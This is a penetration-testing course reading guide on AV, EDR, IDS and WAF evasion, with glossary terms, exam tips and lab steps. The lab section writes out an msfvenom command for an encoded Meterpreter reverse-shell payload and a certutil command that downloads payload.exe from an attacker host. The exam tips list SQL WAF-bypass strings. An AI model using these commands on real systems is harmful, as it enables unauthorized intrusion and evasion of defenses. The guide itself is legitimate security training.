# Reading Guide: Module 14 - Evasion Techniques and AV Bypass
## Course: CIS-4333_Penetration_Testing (CompTIA PenTest+)

---

### Introduction
Welcome to **Module 14 - Evasion Techniques and AV Bypass**! Mature enterprise environments deploy security controls — antivirus (AV), endpoint detection and response (EDR), intrusion detection systems (IDS), and web application firewalls (WAF) — specifically to detect and block penetration testing techniques. Evasion is the discipline of modifying attacks to avoid these controls while still achieving the test objective. Understanding evasion techniques allows pentesters to accurately assess whether an organization's defenses would stop a real-world attacker or merely detect commodity tools. This module maps to the **Attacks and Exploits** domain of PT0-002 (**30% of exam weight**) and the **Tools and Code Analysis** domain (**16% of exam weight**).

Evasion findings are particularly valuable in pentest reports — demonstrating that an attacker can bypass AV with a custom payload directly challenges a client's assumption that standard AV provides adequate protection.

---

### 1. High-Yield Glossary
Review these essential definitions carefully. The certification exam expects you to know these concepts inside and out:

*   **Payload Encoding and Obfuscation**: Techniques used to transform a payload's byte pattern so that signature-based AV engines do not recognize it as malicious. `msfvenom` supports encoders like `shikata_ga_nai` (x86 XOR encoder) that apply repeated XOR operations to shellcode, changing its byte signature on each iteration. Obfuscation changes the appearance of code (variable renaming, string splitting, junk code insertion) without changing its functionality. Neither technique reliably bypasses modern behavioral AV/EDR, which executes code in a sandbox to observe behavior rather than matching static signatures.

*   **Living Off the Land (LoTL)**: An evasion strategy in which the attacker uses tools and binaries already present on the target system — called LOLBins (Living Off the Land Binaries) — rather than dropping custom malware. Windows examples include `certutil.exe` (download files), `powershell.exe` (execute scripts), `regsvr32.exe` (execute COM objects), and `mshta.exe` (execute HTA files). Because these are legitimate system tools, they often bypass application whitelisting and AV. PT0-002 tests awareness of LoTL as an evasion concept.

*   **Process Injection**: A technique in which an attacker injects malicious code into the memory space of a legitimate running process to execute it under that process's identity and security context. Common methods include DLL injection, process hollowing, and reflective DLL loading. By running under a trusted process (e.g., `explorer.exe`, `svchost.exe`), the payload evades process-based detection and inherits the host process's privileges and network connections. Meterpreter's `migrate` command performs a form of process injection.

*   **Signature-Based vs. Behavioral Detection**: Signature-based AV matches file content against a database of known malware patterns (hashes, byte sequences). Behavioral/heuristic detection observes what code does at runtime — monitoring API calls, memory allocations, network connections, and process spawning — to identify malicious activity patterns regardless of the code's appearance. Modern EDR products primarily use behavioral detection, making static encoding/obfuscation insufficient as a standalone evasion technique.

*   **Custom Payload Generation and `msfvenom` Options**: Beyond basic encoding, `msfvenom` supports output format selection (`-f exe`, `-f elf`, `-f raw`, `-f python`), payload stageless vs. staged selection, and multiple encoder iterations (`-i 10` for 10 encoding rounds). For AV bypass, testers may use custom C/C++ shellcode loaders, Python-based payload wrappers, or commercial tools like Cobalt Strike's payload generator that produce less-detectable artifacts than standard Metasploit payloads.

---

### 2. Certification Exam Tips
*   **Domain Weight:** Evasion content appears in both Attacks and Exploits (30%) and Tools and Code Analysis (16%). Know the evasion category names and when each approach is appropriate.
*   **Encoding Does Not Reliably Bypass Modern AV:** PT0-002 tests that modern behavioral AV/EDR is not reliably bypassed by payload encoding alone. The `shikata_ga_nai` encoder in msfvenom is widely signature-known. Real bypass requires behavioral evasion, LoTL techniques, or custom payloads. Know this distinction for scenario questions.
*   **WAF Evasion Techniques:** Web Application Firewalls can be evaded by: case manipulation (`SeLeCt` instead of `SELECT`), comment injection (`SEL/**/ECT`), URL encoding (`%27` instead of `'`), double encoding, and using alternative SQL syntax. PT0-002 tests basic WAF evasion awareness.
*   **IDS/IPS Evasion:** Network-based IDS evasion techniques include: packet fragmentation, TTL manipulation, protocol-level obfuscation, and timing attacks (slow scans with `-T0` in Nmap). Know that IDS evasion is distinct from AV/EDR evasion — it operates at the network layer rather than the endpoint.
*   **Exam Trap — Evasion Requires Authorization:** Testing AV bypass techniques against a client's environment requires explicit scope authorization. If AV testing is not in the Rules of Engagement, the tester should not attempt to bypass endpoint controls even if technically capable.
*   **Study Resource:** [TryHackMe Pentest Learning Path](https://tryhackme.com/path/outline/pentesting) — The "Obfuscation," "AV Evasion," and "Evading IDS/Firewalls" rooms provide browser-based guided practice with payload encoding, obfuscation techniques, and behavioral detection evasion concepts in a legal lab environment.
*   **Video Lecture:** [CompTIA PenTest+ Complete Course by freeCodeCamp](https://www.youtube.com/watch?v=3Kq1MIfC-4U) — Navigate to the Evasion Techniques section for content covering AV bypass methods, LoTL techniques, and detection evasion concepts mapped to PT0-002 domains 3 and 5.

---

### Required Readings & Videos
To prepare for this module's topics, you must complete the following readings and videos:
*   **Required Reading:** Complete the AV Evasion and Obfuscation rooms in the [TryHackMe Pentest Learning Path](https://tryhackme.com/path/outline/pentesting). TryHackMe is a browser-based cybersecurity training platform — all labs run in your browser without requiring a local AV test environment. The evasion rooms walk through payload encoding, shellcode obfuscation, and Living Off the Land techniques with guided hands-on exercises against realistic detection environments.
*   **Required Video:** Watch the Evasion Techniques segment of the [CompTIA PenTest+ Complete Course by freeCodeCamp](https://www.youtube.com/watch?v=3Kq1MIfC-4U). This is a free, full-length PT0-002 prep course on YouTube. Use chapter markers to navigate to the evasion content covering AV bypass, payload obfuscation, process injection, and LoTL binaries.

---

### Lab & Command Integration
In this week's hands-on lab, you will perform the following steps to apply these concepts:
*   **Generate an encoded payload with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe`**: You will generate a Meterpreter payload with five rounds of XOR encoding, observe whether the resulting binary is detected by a lab AV scanner, and compare it against an unencoded payload — demonstrating the limits of signature-based evasion.
*   **Test a Living Off the Land download technique**: You will use `certutil.exe -urlcache -split -f http://<attacker_ip>/payload.exe payload.exe` to download a file using a built-in Windows binary — documenting why this technique evades application whitelisting controls that block unknown executables but permit signed system tools.
*   **Migrate a Meterpreter session into a legitimate process**: From an active Meterpreter session, you will use the `migrate` command to move the payload's execution into a trusted process, observe how this changes the session's apparent process identity, and document what this technique demonstrates about process-based endpoint detection limitations.

---

### 3. Study Checklist
- [ ] Read the glossary terms and be able to explain each in your own words.
- [ ] Complete the AV Evasion and Obfuscation rooms in [TryHackMe Pentest Learning Path](https://tryhackme.com/path/outline/pentesting).
- [ ] Watch the Evasion Techniques section of the [CompTIA PenTest+ Complete Course by freeCodeCamp](https://www.youtube.com/watch?v=3Kq1MIfC-4U).
- [ ] Review the lab instructions and understand the purpose of each step before starting.
- [ ] Proceed to the weekly hands-on lab activity.
